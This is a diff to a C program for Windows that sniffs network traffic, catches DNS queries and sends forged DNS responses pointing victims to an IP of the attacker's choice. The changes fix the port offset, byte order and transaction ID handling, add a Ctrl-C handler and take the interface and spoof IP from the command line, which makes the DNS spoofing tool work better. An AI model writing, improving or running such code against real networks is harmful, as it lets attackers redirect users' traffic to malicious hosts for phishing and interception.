@@ -36,6 +36,8 @@ typedef struct ip_packet {
 } 
 ip_packet;
 
+int HasUserBroke = 0;
+
 #define BUFFER_SIZE_HDR sizeof(struct pcap_sf_pkthdr)
 #define BUFFER_SIZE_ETH 14
 #define BUFFER_SIZE_PKT ((256*256) - 1)
@@ -53,7 +55,7 @@ ip_packet;
 int extract_headers_and_send_dns_response(unsigned char* buffer, char spoofIP[4]) {
 	ip_packet* packet = (ip_packet*)buffer;
 
-	int ipLength = (packet->versionAndLength & 0b00001111)* (packet->versionAndLength >> 4);
+	int ipLength = (packet->versionAndLength & 0b00001111) * (packet->versionAndLength >> 4);
 
 	if (packet->versionAndLength != 0x45)
 		return 0;
@@ -64,9 +66,11 @@ int extract_headers_and_send_dns_response(unsigned char* buffer, char spoofIP[4]
 	else if (packet->protocol == IPPROTO_UDP) {
 
 		unsigned short* sourcePort = (unsigned short*)(buffer + ipLength);
-		unsigned short* destPort = ((unsigned short*)(buffer + ipLength + 3));
+		unsigned short* destPort = ((unsigned short*)(buffer + ipLength + 2));
 
-		if (*destPort == 53) {
+		unsigned short srcPort = ntohs(*sourcePort), dstPort = ntohs(*destPort);
+
+		if (dstPort == 53) {
 #ifdef LOG
 			printf("IP Version: %u\n", packet->versionAndLength >> 4);
 
@@ -84,13 +88,13 @@ int extract_headers_and_send_dns_response(unsigned char* buffer, char spoofIP[4]
 			// dns
 			printf("DNS:\n");
 
-			printf("source port: %u\n", *sourcePort);
-			printf("dest port: %u\n", *destPort);
+			printf("source port: %u\n", srcPort);
+			printf("dest port: %u\n", dstPort);
 #endif
 
 			unsigned char udpLength = *(buffer + ipLength + 4) + *(buffer + ipLength + 5);
 
-			unsigned short transactionId = *((unsigned short*)(buffer + ipLength + UDP_HEADER_LEN));
+			unsigned short transactionId = ntohs(*((unsigned short*)(buffer + ipLength + UDP_HEADER_LEN)));
 
 #ifdef LOG
 			printf("Transaction ID: %u\n", transactionId);
@@ -123,11 +127,10 @@ int extract_headers_and_send_dns_response(unsigned char* buffer, char spoofIP[4]
 			// TODO: create a transaction increament
 			for (int i = 1; i <= NO_OF_DNS_REPLAY_PACKETS; i++) {
 				int packet_len = 0;
-				char* packet = prepare_dns_packet(dnsRecord, strlen(dnsRecord), &packet_len, transactionId + i, spoofIP);
+				char* packet = prepare_dns_packet(dnsRecord, strlen(dnsRecord), &packet_len, transactionId, spoofIP);
 				int result = send_dns_packet(packet, packet_len, *sourcePort, sourceIP);
-
 #ifdef LOG
-				printf("Sent DNS Replay packet with trans id: %u to domain: %s\n", transactionId+i, dnsRecord);
+				printf("Sent DNS Replay packet with trans id: %u to domain: %s\n", transactionId, dnsRecord);
 
 				free(packet);
 #endif
@@ -138,6 +141,17 @@ int extract_headers_and_send_dns_response(unsigned char* buffer, char spoofIP[4]
 	}
 
 	return 0;
+}
+
+BOOL WINAPI consoleHandler(DWORD signal) {
+
+	if (signal == CTRL_C_EVENT)
+	{
+		HasUserBroke = 1;
+		printf("Cleaning up...\nExited\n");
+	}
+
+	return TRUE;
 }
 
 void start_sniffing(char* interface_ip, char spoofIP[4]) {
@@ -181,7 +195,7 @@ void start_sniffing(char* interface_ip, char spoofIP[4]) {
 		exit(-1);
 	}
 	
-	while (1) {
+	while (!HasUserBroke) {
 		memset(buffer, 0, BUFFER_SIZE_HDR + BUFFER_SIZE_PKT);
 		result = recv(sock, (char*)buffer + BUFFER_OFFSET_IP, BUFFER_SIZE_IP, 0);
 
@@ -202,34 +216,15 @@ void start_sniffing(char* interface_ip, char spoofIP[4]) {
 
 int main(int argc, char** argv) {
 
-	/*if (argc < 2) {
+	if (argc != 3) {
 		fprintf(stderr, "Usage: %s <ip-of-interface> <spoof-ip>\n", argv[0]);
 		exit(-1);
-	}*/
+	}
 
-	//char* ip = (char*)malloc(sizeof(char) * 4);
-	//ip[0] = 192;
-	//ip[1] = 168;
-	//ip[2] = 80;
-	//ip[3] = 130;
+	char spoofIP[4];
+	inet_pton(AF_INET, argv[2], spoofIP);
 
-	//start_sniffing(argv[1], ip); // for production
-	//
-	//free(ip);
-
-	char *ip = (char*)malloc(sizeof(char)*4);
-	ip[0] = 192;
-	ip[1] = 168;
-	ip[2] = 1;
-	ip[3] = 8;
-
-	const char* staticIP = "192.168.1.2";
-	char* interfaceIP = (char*)malloc(sizeof(char) * (strlen(staticIP)+1));
-	strncpy_s(interfaceIP, strlen(interfaceIP)+1, staticIP, strlen(staticIP));
-
-	start_sniffing(interfaceIP, ip); // for testing
+	start_sniffing(argv[1], spoofIP); // for production
 	
-	free(interfaceIP);
-	free(ip);
-	
+	//SetConsoleCtrlHandler(consoleHandler, true);
 }
